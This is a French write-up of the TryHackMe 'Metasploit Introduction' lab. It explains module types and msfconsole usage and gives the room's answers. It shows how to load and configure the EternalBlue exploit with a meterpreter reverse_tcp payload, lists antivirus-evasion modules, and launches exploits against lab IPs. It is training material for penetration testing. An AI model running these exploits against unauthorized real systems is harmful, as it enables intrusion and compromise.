---
title: "TryHackMe - Metasploit Introduction"
date: 2025-10-16 01:11:00 +0200
categories: [TryHackMe, Learning, Metasploit]
tags: [reverse-shell, exploitation, msfconsole, meterpreter, enumeration]
description: "Write-up de la room Metasploit Introduction - apprendre à utiliser et maîtriser le Framework Metasploit (Partie 1 sur 3)"
image:
  path: /assets/img/posts/tryhackme-metasploit-introduction.png
  alt: "Metasploit Introduction"
---

## Informations sur la room

Room d'introduction aux composants principaux du Framework Metasploit, l'outil de pentesting le plus populaire.

**Lien :** [Metasploit Introduction](https://tryhackme.com/room/metasploitintro)

## Objectifs d'apprentissage

Cette room couvre les points suivants :
- Comprendre le fonctionnement du Framework Metasploit
- Maîtriser l'interface msfconsole
- Découvrir les différents types de modules
- Configurer et lancer des exploits

---

## Solutions des tâches

### Task 1 - Introduction to Metasploit

**Les deux versions de Metasploit**

Metasploit existe en deux versions distinctes :

**Metasploit Pro**
- Version commerciale destinée aux entreprises
- Dispose d'une interface graphique (GUI)
- Fonctionnalités avancées de reporting et d'automatisation

**Metasploit Framework**
- Version open source et gratuite
- Interface en ligne de commande
- Version sur laquelle nous allons nous concentrer

**Composants principaux du Framework**

Le Framework Metasploit est composé de plusieurs outils :

**msfconsole**
- Interface principale en ligne de commande
- Point d'entrée pour toutes les fonctionnalités de Metasploit

**Modules**
- Modules de support : exploits, scanners, payloads, encoders, etc.
- Organisés par catégories et systèmes d'exploitation

**Tools**
- Outils autonomes facilitant la recherche de vulnérabilités
- Exemples : msfvenom, pattern_create, pattern_offset
- msfvenom sera abordé dans ce module
- pattern_create et pattern_offset sont utilisés pour le développement d'exploits (hors scope de ce module)

### Task 2 - Main Components of Metasploit

**Démarrage de Metasploit**

Pour lancer Metasploit, il suffit d'exécuter la commande suivante :

```bash
msfconsole
```

**Concepts fondamentaux**

Avant de commencer, il est essentiel de comprendre ces trois concepts clés :

**Exploit**
- Code qui tire parti d'une vulnérabilité présente dans un système cible
- Permet d'exploiter une faille pour obtenir un accès ou exécuter du code

**Vulnerability (Vulnérabilité)**
- Faille dans la conception, la logique ou le code d'un système
- Erreur de sécurité que nous allons pouvoir exploiter

**Payload**
- Code qui s'exécutera sur le système cible après l'exploitation
- Permet d'obtenir le résultat souhaité (shell, backdoor, exécution de commande, etc.)
- L'exploit ouvre la porte, le payload est ce qui entre par cette porte

> Un exploit exploite une vulnérabilité, mais c'est le payload qui définit ce qui se passera une fois l'exploitation réussie.
{: .prompt-info }

**Organisation des modules Metasploit**

Les modules Metasploit sont organisés dans différentes catégories :

#### Auxiliary

Modules d'assistance pour diverses tâches de reconnaissance et d'analyse :

```bash
root@ip-10-10-135-188:/opt/metasploit-framework/embedded/framework/modules# tree -L 1 auxiliary/
auxiliary/
├── admin
├── analyze
├── bnat
├── client
├── cloud
├── crawler
├── docx
├── dos
├── example.py
├── example.rb
├── fileformat
├── fuzzers
├── gather
├── parser
├── pdf
├── scanner
├── server
├── sniffer
├── spoof
├── sqli
├── voip
└── vsploit
```

Ces modules incluent des scanners, crawlers, fuzzers et autres outils d'énumération.

#### Encoders

Les encoders permettent d'encoder l'exploit et le payload dans l'espoir de contourner les solutions antivirus basées sur les signatures.

```bash
root@ip-10-10-135-188:/opt/metasploit-framework/embedded/framework/modules# tree -L 1 encoders/
encoders/
├── cmd
├── generic
├── mipsbe
├── mipsle
├── php
├── ppc
├── ruby
├── sparc
├── x64
└── x86
```

> Les solutions antivirus basées sur les signatures disposent d'une base de données de menaces connues. Les encoders tentent de modifier la signature du code malveillant pour éviter la détection. Cependant, les antivirus modernes effectuent des analyses comportementales, ce qui limite l'efficacité des encoders.
{: .prompt-warning }

#### Evasion

Les modules d'évasion tentent activement de contourner les logiciels antivirus et les solutions de sécurité.

```bash
root@ip-10-10-135-188:/opt/metasploit-framework/embedded/framework/modules# tree -L 2 evasion/
evasion/
└── windows
    ├── applocker_evasion_install_util.rb
    ├── applocker_evasion_msbuild.rb
    ├── applocker_evasion_presentationhost.rb
    ├── applocker_evasion_regasm_regsvcs.rb
    ├── applocker_evasion_workflow_compiler.rb
    ├── process_herpaderping.rb
    ├── syscall_inject.rb
    ├── windows_defender_exe.rb
    └── windows_defender_js_hta.rb
```

> Contrairement aux encoders qui modifient simplement la signature, les modules d'évasion utilisent des techniques actives de bypass des mécanismes de sécurité.
{: .prompt-info }

#### Exploits

Les exploits sont soigneusement classés par système d'exploitation :

```bash
root@ip-10-10-135-188:/opt/metasploit-framework/embedded/framework/modules# tree -L 1 exploits/
exploits/
├── aix
├── android
├── apple_ios
├── bsd
├── bsdi
├── dialup
├── example_linux_priv_esc.rb
├── example.py
├── example.rb
├── example_webapp.rb
├── firefox
├── freebsd
├── hpux
├── irix
├── linux
├── mainframe
├── multi
├── netware
├── openbsd
├── osx
├── qnx
├── solaris
├── unix
└── windows
```

Cette organisation facilite la recherche d'exploits spécifiques à un système d'exploitation cible.

#### NOPs

NOP signifie "No OPeration" - littéralement "aucune opération".

```bash
root@ip-10-10-135-188:/opt/metasploit-framework/embedded/framework/modules# tree -L 1 nops/
nops/
├── aarch64
├── armle
├── cmd
├── mipsbe
├── php
├── ppc
├── sparc
├── tty
├── x64
└── x86
```

Dans la famille de processeurs Intel x86, le NOP est représenté par l'instruction `0x90`. Lorsque le processeur rencontre cette instruction, il ne fait rien pendant un cycle.

> Les NOPs sont souvent utilisés comme tampon pour obtenir des tailles de payload cohérentes, notamment lors du développement d'exploits de type buffer overflow.
{: .prompt-tip }

#### Payloads

Les payloads définissent ce qui sera exécuté sur le système cible après l'exploitation réussie.

```bash
root@ip-10-10-135-188:/opt/metasploit-framework/embedded/framework/modules# tree -L 1 payloads/
payloads/
├── adapters
├── singles
├── stagers
└── stages
```

**Exemples d'objectifs de payloads :**
- Obtenir un shell interactif
- Charger un logiciel malveillant
- Installer une backdoor persistante
- Exécuter une commande spécifique
- Lancer calc.exe comme preuve de concept (PoC)

> Lancer la calculatrice (calc.exe) à distance est un moyen inoffensif de prouver qu'on peut exécuter du code sur le système cible, idéal pour les rapports de pentest.
{: .prompt-info }

**Types de payloads**

Il existe trois catégories principales de payloads :

**Singles**
- Payloads autonomes et complets
- Tout le code nécessaire est envoyé en une seule fois
- Plus faciles à détecter mais plus simples à utiliser
- Exemple : envoyer un colis complet d'un coup

**Stagers + Stages**
- Processus en deux étapes
- Le stager (première étape) est un petit payload qui établit la connexion
- Le stage (seconde étape) est le payload complet téléchargé ensuite
- Plus discrets car le stager est petit
- Exemple : d'abord envoyer une clé (stager), puis faire entrer les meubles une fois la porte ouverte (stage)

**Adapters**
- Permettent d'adapter un payload à différents formats
- Utiles pour contourner certaines restrictions
- Exemple : changer l'emballage du colis selon le service de livraison

> **Astuce pour identifier les payloads staged :** Si dans le nom du payload, "reverse" et "shell" sont séparés par un `/`, c'est un staged payload. Si les mots sont séparés par un `_`, c'est un single payload.
{: .prompt-tip }

#### Post

Les modules post-exploitation sont utilisés après avoir obtenu un accès au système cible.

```bash
root@ip-10-10-135-188:/opt/metasploit-framework/embedded/framework/modules# tree -L 1 post/
post/
├── aix
├── android
├── apple_ios
├── bsd
├── firefox
├── hardware
├── linux
├── multi
├── networking
├── osx
├── solaris
└── windows
```

Ces modules permettent de collecter des informations, maintenir l'accès, pivoter vers d'autres systèmes, etc.

---

**What is the name of the code taking advantage of a flaw on the target system?**

Le code qui tire parti d'une faille dans un système est appelé un exploit.

**Réponse :** `exploit`

**What is the name of the code that runs on the target system to achieve the attacker's goal?**

Le code qui s'exécute sur le système cible pour atteindre les objectifs de l'attaquant est le payload.

**Réponse :** `payload`

**What are self-contained payloads called?**

Les payloads autonomes qui contiennent tout le code nécessaire en une seule fois sont appelés singles.

**Réponse :** `singles`

**Is "windows/x64/pingback_reverse_tcp" among singles or staged payload?**

Pour identifier le type de payload, regardons sa structure : `windows/x64/pingback_reverse_tcp`

Ce payload ne contient pas le mot "shell" et utilise des underscores (`_`) entre les mots plutôt que des slashes (`/`). De plus, "pingback_reverse_tcp" suggère une communication simple sans étape de staging.

**Réponse :** `singles`

### Task 3 - Msfconsole

**Utilisation de base de msfconsole**

Pour sélectionner un exploit, on utilise la commande `use` :

```bash
msf6 > use exploit/windows/smb/ms17_010_eternalblue 
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms17_010_eternalblue) >
```

> Notez que Metasploit sélectionne automatiquement un payload par défaut lorsqu'on charge un exploit.
{: .prompt-info }

**Exécution de commandes système**

Il est possible d'exécuter des commandes système directement depuis msfconsole :

```bash
msf6 exploit(windows/smb/ms17_010_eternalblue) > ls
[*] exec: ls

burp.json   Desktop    Instructions  Postman  Scripts  thinclient_drives
CTFBuilder  Downloads  Pictures      Rooms    snap     Tools
```

**Visualiser les options d'un module**

La commande `show options` affiche tous les paramètres configurables d'un exploit :

```bash
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options 

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS                          yes       The target host(s), see https://docs.metasploit.com/
                                             docs/using-metasploit/basics/using-metasploit.html
   RPORT          445              yes       The target port (TCP)
   SMBDomain                       no        (Optional) The Windows domain to use for authentication
   SMBPass                         no        (Optional) The password for the specified username
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.161.244    yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Target


View the full module info with the info, or info -d command.
```

Cette commande est essentielle pour comprendre comment configurer un exploit. Elle affiche :
- Les options du module (paramètres de l'exploit)
- Les options du payload
- La cible de l'exploit

**Comparaison avec un module plus simple**

Tous les modules n'ont pas autant d'options. Voici un exemple de module post-exploitation :

```bash
msf6 post(windows/gather/enum_domain_users) > show options 

Module options (post/windows/gather/enum_domain_users):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   HOST                      no        Target a specific host
   SESSION                   yes       The session to run this module on
   USER                      no        Target User for NetSessionEnum


View the full module info with the info, or info -d command.
```

**Afficher les payloads compatibles**

La commande `show payloads` liste tous les payloads compatibles avec l'exploit sélectionné :

```bash
msf6 exploit(windows/smb/ms17_010_eternalblue) > show payloads

Compatible Payloads
===================

   #   Name                                        Disclosure Date  Rank    Check  Description
   -   ----                                        ---------------  ----    -----  -----------
   0   generic/custom                                               manual  No     Custom Payload
   1   generic/shell_bind_tcp                                       manual  No     Generic Command Shell, Bind TCP Inline
   2   generic/shell_reverse_tcp                                    manual  No     Generic Command Shell, Reverse TCP Inline
   3   windows/x64/exec                                             manual  No     Windows x64 Execute Command
   4   windows/x64/loadlibrary                                      manual  No     Windows x64 LoadLibrary Path
   5   windows/x64/messagebox                                       manual  No     Windows MessageBox x64
   6   windows/x64/meterpreter/bind_ipv6_tcp                        manual  No     Windows Meterpreter (Reflective Injection x64), Windows x64 IPv6 Bind TCP Stager
   7   windows/x64/meterpreter/bind_ipv6_tcp_uuid                   manual  No     Windows Meterpreter (Reflective Injection x64), Windows x64 IPv6 Bind TCP Stager with UUID Support
```

**Rechercher des modules**

La base de données de Metasploit est immense. La commande `search` permet de trouver rapidement des modules :

```bash
msf6 > search ms17-010

Matching Modules
================

   #  Name                                      Disclosure Date  Rank     Check  Description
   -  ----                                      ---------------  ----     -----  -----------
   0  auxiliary/admin/smb/ms17_010_command      2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   1  auxiliary/scanner/smb/smb_ms17_010                         normal   No     MS17-010 SMB RCE Detection
   2  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   3  exploit/windows/smb/ms17_010_psexec       2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   4  exploit/windows/smb/smb_doublepulsar_rce  2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution


Interact with a module by name or index, for example use 4 or use exploit/windows/smb/smb_doublepulsar_rce
```

**Recherche avancée avec filtres**

Il est possible d'affiner la recherche avec des filtres :

```bash
search type:auxiliary telnet
```

Filtres disponibles :
- `type:` (auxiliary, exploit, post, etc.)
- `platform:` (windows, linux, etc.)
- `name:` (recherche dans le nom)
- `cve:` (recherche par CVE)

> Les exploits exploitent une vulnérabilité du système cible et peuvent présenter un comportement imprévisible. Un exploit de rang faible peut parfaitement fonctionner, tandis qu'un exploit de rang élevé peut échouer ou, dans le pire des cas, crasher le système cible.
{: .prompt-warning }

---

**How would you search for a module related to Apache?**

Pour rechercher des modules liés à Apache, il suffit d'utiliser la commande search avec le mot-clé.

**Réponse :** `search apache`

**Who provided the auxiliary/scanner/ssh/ssh_login module?**

Pour trouver l'auteur d'un module, sélectionnons-le puis affichons ses informations :

```bash
msf6 > use auxiliary/scanner/ssh/ssh_login
msf6 auxiliary(scanner/ssh/ssh_login) > show info
```

Résultat :

```bash
       Name: SSH Login Check Scanner
     Module: auxiliary/scanner/ssh/ssh_login
    License: Metasploit Framework License (BSD)
       Rank: Normal

Provided by:
  todb <todb@metasploit.com>

Check supported:
  No

Basic options:
  Name              Current Setting  Required  Description
  ----              ---------------  --------  -----------
  ANONYMOUS_LOGIN   false            yes       Attempt to login with a blank username and password
  BLANK_PASSWORDS   false            no        Try blank passwords for all users
  BRUTEFORCE_SPEED  5                yes       How fast to bruteforce, from 0 to 5
  [...]
```

L'auteur est indiqué dans la section "Provided by".

**Réponse :** `todb`

### Task 4 - Working with modules

**Configuration des paramètres**

Une fois qu'un exploit est sélectionné, il faut configurer ses paramètres avec la commande `set` :

```bash
set PARAMETER_NAME VALUE
```

**Exemple de configuration**

Visualisons d'abord les options disponibles :

```bash
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS                          yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:'
   RPORT          445              yes       The target port (TCP)
   SMBDomain      .                no        (Optional) The Windows domain to use for authentication
   SMBPass                         no        (Optional) The password for the specified username
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.44.70      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows 7 and Server 2008 R2 (x64) All Service Packs
```

Configurons maintenant l'adresse IP cible :

```bash
msf6 exploit(windows/smb/ms17_010_eternalblue) > set rhosts 10.10.165.39
rhosts => 10.10.165.39
```

**Paramètres essentiels**

Voici les paramètres les plus couramment utilisés :

**RHOSTS** (Remote Host)
- Adresse IP du système cible
- Peut être une seule IP ou une plage réseau (ex: 192.168.1.0/24)

**RPORT** (Remote Port)
- Port sur lequel l'application vulnérable écoute
- Exemple : 445 pour SMB, 80 pour HTTP, 22 pour SSH

**PAYLOAD**
- Le payload à utiliser avec l'exploit
- Définit ce qui sera exécuté après l'exploitation

**LHOST** (Local Host)
- Adresse IP de la machine de l'attaquant
- Utilisée pour les reverse shells

**LPORT** (Local Port)
- Port sur lequel l'attaquant écoute
- Utilisé pour recevoir les connexions reverse shell

**SESSION**
- Identifiant de session pour les modules post-exploitation
- Chaque connexion établie reçoit un ID unique

**Supprimer des paramètres**

Pour supprimer un paramètre configuré, utilisez `unset` :

```bash
unset PARAMETER_NAME
```

Pour tout réinitialiser :

```bash
unset all
```

**Variables globales**

Les variables globales sont persistantes entre les différents modules. Elles sont particulièrement utiles pour éviter de reconfigurer les mêmes paramètres.

**Définir une variable globale :**

```bash
setg PARAMETER_NAME VALUE
```

Exemple :

```bash
setg RHOSTS 10.10.19.23
```

Cette adresse IP sera automatiquement utilisée dans tous les modules jusqu'à ce qu'elle soit désactivée.

**Supprimer une variable globale :**

```bash
unsetg PARAMETER_NAME
```

> Les variables globales sont un gain de temps considérable lors du pentest. Configurez une fois les paramètres communs (LHOST, RHOSTS) et ils seront disponibles partout !
{: .prompt-tip }

**Lancer l'exploitation**

Une fois tout configuré, lancez l'exploit avec :

```bash
exploit
```

Ou alternativement :

```bash
run
```

**Options avancées d'exécution**

**Exécution en arrière-plan :**

```bash
exploit -z
```

Cette option lance l'exploit en arrière-plan, utile pour les exploits qui prennent du temps.

> Lorsqu'un exploit s'exécute en arrière-plan, vous pouvez continuer à utiliser msfconsole pour d'autres tâches. Metasploit vous notifiera quand l'exploitation réussit ou échoue.
{: .prompt-info }

**Gestion des sessions**

Une fois l'exploitation réussie, vous obtenez une session Meterpreter ou un shell.

**Mettre une session en arrière-plan (depuis Meterpreter) :**

```bash
background
```

Cette commande met la session en pause et vous ramène à msfconsole.

**Revenir à une session (depuis msfconsole) :**

```bash
sessions -i <session_id>
```

**Lister toutes les sessions actives :**

```bash
sessions -l
```

**Quitter un module (depuis msfconsole) :**

```bash
back
```

Cette commande vous ramène au prompt principal de msfconsole sans quitter le programme.

---

**How would you set the LPORT value to 6666?**

Pour définir le port local à 6666, utilisez la commande set avec le paramètre LPORT.

**Réponse :** `set LPORT 6666`

**How would you set the global value for RHOSTS to 10.10.19.23?**

Pour définir une variable globale qui sera disponible dans tous les modules, utilisez setg.

**Réponse :** `setg RHOSTS 10.10.19.23`

**What command would you use to clear a set payload?**

Pour supprimer un payload configuré, utilisez la commande unset.

**Réponse :** `unset PAYLOAD`

**What command do you use to proceed with the exploitation phase?**

Pour lancer l'exploitation après avoir configuré tous les paramètres, utilisez la commande exploit.

**Réponse :** `exploit`

### Task 5 - Summary

Cette première partie nous a permis de découvrir les bases du Framework Metasploit :
- L'architecture et les différents types de modules
- La navigation dans msfconsole
- La configuration des exploits
- La gestion des sessions

Dans les prochaines parties, nous approfondirons l'utilisation de Meterpreter et les techniques avancées d'exploitation.

---

**Room complétée**

{% include comments.html %}